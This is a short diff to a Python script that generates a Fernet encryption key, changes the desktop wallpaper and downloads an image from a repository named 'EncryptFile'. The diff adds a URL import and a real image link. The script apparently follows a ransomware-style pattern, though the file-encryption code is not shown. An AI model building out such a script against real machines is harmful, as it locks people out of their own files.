@@ -2,6 +2,7 @@ from cryptography.fernet import Fernet
 import os
 import ctypes
 import platform
+import urllib.request
 
 # Generate key
 key=Fernet.generate_key()
@@ -55,7 +56,7 @@ def changeWallpaper(file_path):
         print("Unsupported operating system.")
 
 if __name__ == "__main__":
-    wallpaper_url = "https://example.com/path/to/your/image.jpg"
+    wallpaper_url = "https://github.com/tompilooo/EncryptFile/blob/main/bt.jpg"
     download_path = "bt.jpg"
     
     # Download the file
